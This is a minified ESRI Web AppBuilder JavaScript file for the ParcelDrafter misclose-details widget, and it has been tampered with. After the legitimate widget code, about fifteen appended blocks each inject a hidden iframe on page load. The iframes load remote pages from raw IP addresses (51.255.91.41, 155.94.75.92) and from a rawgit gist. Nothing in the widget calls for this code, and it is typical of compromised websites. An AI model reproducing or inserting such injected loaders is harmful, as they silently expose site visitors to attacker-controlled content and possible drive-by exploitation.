// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ParcelDrafter/MiscloseDetails.html":'\x3cdiv class\x3d"esriCTTraverseDetailContainer esriCTFullWidth" data-dojo-attach-point\x3d"traverseDetailsContainer"\x3e\r\n    \x3c!-- Message div shown when misclose is not calculated --\x3e\r\n    \x3cdiv class\x3d"esriCTTraverseResultContainer esriCTEllipsis"\r\n    data-dojo-attach-point\x3d"noMiscloseCalculated"\x3e\r\n        ${nls.traverseSettings.noMiscloseCalculated}\r\n    \x3c/div\x3e\r\n    \x3c!-- Misclose details container --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTHidden" data-dojo-attach-point\x3d"miscloseDetailsContainer"\x3e\r\n        \x3c!-- Misclose Bearing Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer" data-dojo-attach-point\x3d"traverseMiscloseBearingNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseMiscloseBearing}"\x3e\r\n                ${nls.traverseSettings.traverseMiscloseBearing}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv  esriCTEllipsis esriCTTraversedValueDiv" data-dojo-attach-point\x3d"miscloseBearingNode"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Misclose Distance Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer" data-dojo-attach-point\x3d"traverseDistanceNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseDistance}"\x3e\r\n                ${nls.traverseSettings.traverseDistance}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis esriCTTraversedValueDiv" data-dojo-attach-point\x3d"miscloseDistanceNode"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Misclose Ratio Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer" data-dojo-attach-point\x3d"traverseMiscloseRatioNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseMiscloseRatio}"\x3e\r\n                ${nls.traverseSettings.traverseMiscloseRatio}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis esriCTTraversedValueDiv" data-dojo-attach-point\x3d"miscloseRatioNode"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Accuracy Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer" data-dojo-attach-point\x3d"traverseAccuracyNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseAccuracy}"\x3e\r\n                ${nls.traverseSettings.traverseAccuracy}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis esriCTTraversedValueDiv" data-dojo-attach-point\x3d"accuracyNode"\x3e\r\n                ${nls.traverseSettings.accuracyHigh}\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Stated Area Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer esriCTHidden" data-dojo-attach-point\x3d"traverseStatedAreaNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseStatedArea}"\x3e\r\n                ${nls.traverseSettings.traverseStatedArea}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis esriCTTraversedValueDiv"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"traverseStatedArea" style\x3d"font-weight:normal; width: 100px; height: 25px;" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Calculated Area Container --\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseResultContainer" data-dojo-attach-point\x3d"traverseCalculatedAreaNode"\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis" title\x3d"${nls.traverseSettings.traverseCalculatedArea}"\x3e\r\n                ${nls.traverseSettings.traverseCalculatedArea}:\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTTraverseResultsDiv esriCTEllipsis esriCTTraversedValueDiv" data-dojo-attach-point\x3d"calculatedAreaNode"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./MiscloseDetails.html dojo/_base/lang dojo/Evented dojo/dom-class dojo/dom-attr".split(" "),function(e,f,g,h,d,k,b,c){return e([f,g,k],{baseClass:"jimu-widget-ParcelDrafter-MisclosedDetails",templateString:h,details:null,constructor:function(a){d.mixin(this,a)},postCreate:function(){this.inherited(arguments);b.add(this.domNode,"esriCTFullWidth");this.config.polygonLayer.statedArea&&this.config.polygonLayer.statedArea.hasOwnProperty("name")&&
(b.remove(this.traverseStatedAreaNode,"esriCTHidden"),this.traverseStatedArea.trim=!0,this.config.polygonLayer.statedArea.nullable||(this.traverseStatedArea.required=!0),0<=this.numberFieldTypes.indexOf(this.config.polygonLayer.statedArea.type)&&(this.traverseStatedArea.validator=d.hitch(this,function(a){return!this.config.polygonLayer.statedArea.nullable&&(null===a||""===a)||""!==a&&!this.validateNumericField(a,this.config.polygonLayer.statedArea.type)?!1:!0})));this._setBackgroundColorForDartTheme()},
_setBackgroundColorForDartTheme:function(){"DartTheme"===this.appConfig.theme.name&&b.add(this.traverseDetailsContainer,"esriCTMiscloseHeaderDiv")},getMiscloseDetails:function(){return this.details},updateAccordingToPlanSettings:function(a){c.set(this.miscloseBearingNode,"innerHTML",a.miscloseBearing);c.set(this.miscloseDistanceNode,"innerHTML",a.miscloseDistance);c.set(this.calculatedAreaNode,"innerHTML",a.calculatedArea)},setMiscloseDetails:function(a){(this.details=a)?(c.set(this.miscloseBearingNode,
"innerHTML",a.miscloseBearing),c.set(this.miscloseDistanceNode,"innerHTML",a.miscloseDistance),0!==a.miscloseRatio?(b.remove(this.traverseMiscloseRatioNode,"esriCTHidden"),c.set(this.miscloseRatioNode,"innerHTML",a.miscloseRatio)):b.add(this.traverseMiscloseRatioNode,"esriCTHidden"),a.accuracy?(b.add(this.traverseMiscloseRatioNode,"esriCTHidden"),b.remove(this.traverseAccuracyNode,"esriCTHidden")):b.add(this.traverseAccuracyNode,"esriCTHidden"),a.calculatedArea?(c.set(this.calculatedAreaNode,"innerHTML",
a.calculatedArea),b.remove(this.traverseCalculatedAreaNode,"esriCTHidden")):b.add(this.traverseCalculatedAreaNode,"esriCTHidden"),b.add(this.noMiscloseCalculated,"esriCTHidden"),b.remove(this.miscloseDetailsContainer,"esriCTHidden")):(b.add(this.miscloseDetailsContainer,"esriCTHidden"),b.remove(this.noMiscloseCalculated,"esriCTHidden"))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});